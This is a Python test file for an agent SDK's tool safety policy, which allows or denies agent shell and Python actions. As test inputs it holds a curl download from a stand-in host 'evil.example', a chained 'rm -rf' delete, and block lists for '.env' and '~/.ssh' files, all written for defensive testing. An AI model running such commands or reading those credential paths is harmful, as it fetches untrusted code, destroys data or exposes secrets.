"""Tests for tool safety policy loading and policy-driven review."""

from __future__ import annotations

import pytest

from trpc_agent_sdk._tool_safety import SafetyReviewer
from trpc_agent_sdk._tool_safety_policy import SafetyPolicyError
from trpc_agent_sdk._tool_safety_policy import ToolSafetyPolicy
from trpc_agent_sdk._tool_safety_policy import load_tool_safety_policy


def test_load_policy_from_yaml(tmp_path) -> None:
    policy_file = tmp_path / "tool_safety_policy.yaml"
    policy_file.write_text(
        """
allowed_domains:
  - api.example.com
blocked_paths:
  read_dotenv:
    - ".env"
  read_ssh:
    - "~/.ssh"
allowed_commands:
  - python3
max_timeout: 30
max_output_size: 4096
risk_levels:
  network_not_allowlisted: critical
""",
        encoding="utf-8",
    )

    policy = load_tool_safety_policy(policy_file)

    assert policy.allowed_domains == ("api.example.com", )
    assert policy.blocked_paths_for("read_dotenv") == (".env", )
    assert policy.blocked_paths_for("read_ssh") == ("~/.ssh", )
    assert policy.allowed_commands == ("python3", )
    assert policy.max_timeout == 30
    assert policy.max_output_size == 4096
    assert policy.risk_level_for("network_not_allowlisted") == "critical"
    assert policy.risk_level_for("read_dotenv") == "high"


def test_load_policy_with_missing_fields_uses_defaults(tmp_path) -> None:
    policy_file = tmp_path / "tool_safety_policy.yaml"
    policy_file.write_text(
        """
allowed_domains:
  - api.example.com
""",
        encoding="utf-8",
    )

    policy = load_tool_safety_policy(policy_file)
    default_policy = ToolSafetyPolicy.default()

    assert policy.allowed_domains == ("api.example.com", )
    assert policy.blocked_paths == default_policy.blocked_paths
    assert policy.allowed_commands == default_policy.allowed_commands
    assert policy.max_timeout == default_policy.max_timeout
    assert policy.max_output_size == default_policy.max_output_size
    assert policy.risk_level_for("read_ssh") == default_policy.risk_level_for("read_ssh")


def test_missing_policy_file_uses_defaults(tmp_path) -> None:
    policy = load_tool_safety_policy(tmp_path / "missing.yaml")

    assert policy == ToolSafetyPolicy.default()


def test_invalid_yaml_format_raises_clear_error(tmp_path) -> None:
    policy_file = tmp_path / "tool_safety_policy.yaml"
    policy_file.write_text("allowed_domains: [", encoding="utf-8")

    with pytest.raises(SafetyPolicyError, match="Invalid tool safety policy YAML"):
        load_tool_safety_policy(policy_file)


def test_invalid_policy_shape_raises_clear_error(tmp_path) -> None:
    policy_file = tmp_path / "tool_safety_policy.yaml"
    policy_file.write_text(
        """
allowed_domains: "api.example.com"
""",
        encoding="utf-8",
    )

    with pytest.raises(SafetyPolicyError, match="allowed_domains"):
        load_tool_safety_policy(policy_file)


def test_allowed_domains_policy_changes_network_decision_without_code_changes(tmp_path) -> None:
    source = "curl https://evil.example/download"
    default_review = SafetyReviewer().review(source, action_type="bash")
    assert default_review.decision == "deny"
    assert default_review.rule_id == "network_not_allowlisted"

    policy_file = tmp_path / "tool_safety_policy.yaml"
    policy_file.write_text(
        """
allowed_domains:
  - evil.example
""",
        encoding="utf-8",
    )
    policy = load_tool_safety_policy(policy_file)

    review = SafetyReviewer(policy=policy).review(source, action_type="bash")

    assert review.decision == "allow"
    assert review.rule_id == "network_allowlist"


def test_allowed_domains_policy_does_not_short_circuit_other_rules() -> None:
    policy = ToolSafetyPolicy(allowed_domains=("api.example.com", ))

    review = SafetyReviewer(policy=policy).review(
        "curl https://api.example.com/download && rm -rf /tmp/demo",
        action_type="bash",
    )

    assert review.decision == "deny"
    assert review.rule_id == "dangerous_delete"


def test_blocked_paths_policy_changes_path_decision_without_code_changes(tmp_path) -> None:
    source = "from pathlib import Path\nprint(Path('.custom_blocked_file').read_text())"
    default_review = SafetyReviewer().review(source, action_type="python")
    assert default_review.decision == "allow"
    assert default_review.rule_id == "safe_python"

    policy_file = tmp_path / "tool_safety_policy.yaml"
    policy_file.write_text(
        """
blocked_paths:
  read_dotenv:
    - ".custom_blocked_file"
""",
        encoding="utf-8",
    )
    policy = load_tool_safety_policy(policy_file)

    review = SafetyReviewer(policy=policy).review(source, action_type="python")

    assert review.decision == "deny"
    assert review.rule_id == "read_dotenv"
    assert review.report["evidence"] == ".custom_blocked_file"
